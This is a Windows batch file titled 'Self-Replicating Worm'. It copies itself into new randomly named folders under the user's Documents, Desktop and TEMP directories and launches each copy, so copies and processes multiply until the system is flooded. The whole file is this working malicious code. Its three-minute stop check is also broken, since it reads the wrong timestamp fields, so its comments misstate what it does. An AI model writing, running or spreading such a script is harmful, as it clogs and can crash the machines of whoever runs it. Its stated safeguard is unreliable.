@echo off
Title Self-Replicating Worm
Color A 

:: Define the maximum execution time for each cycle (in seconds)
set "max_time=180"

:: Array of target directories
set "targets=%USERPROFILE%\Documents %USERPROFILE%\Desktop %TEMP%"

:: Define the name of the replicated script
set "script_name=worm-Selfreplicating.bat"

:main
:: Note the start time
for /f "tokens=2 delims==." %%a in ('wmic os get localdatetime /value ^| find "="') do set "start_time=%%a"

:: Loop through each target directory
for %%d in (%targets%) do (
    call :replicate "%%d"
)

:: Check the elapsed time
:check_time
for /f "tokens=2 delims==." %%a in ('wmic os get localdatetime /value ^| find "="') do set "current_time=%%a"
set /a elapsed_time=(%current_time:~6,2% - %start_time:~6,2%) * 60 + (%current_time:~8,2% - %start_time:~8,2%)

if %elapsed_time% lss %max_time% (
    timeout /t 1 >nul
    goto :check_time
)

:: After 3 minutes, prompt the user
echo 3 minutes have passed.
set /p "user_input=Do you want to continue? (yes/no): "
if /i "%user_input%"=="yes" goto :main
if /i "%user_input%"=="no" goto :end

:end
echo Script execution stopped.
pause
exit /b

:replicate
:: Extract the current target directory
set "current_dir=%~1"

:: Create a new folder in the target directory
set "new_folder=%current_dir%\%random%"
mkdir "%new_folder%"

:: Copy the script into the new folder
copy "%~f0" "%new_folder%\%script_name%"

:: Execute the copied script in the new folder
start "" "%new_folder%\%script_name%"
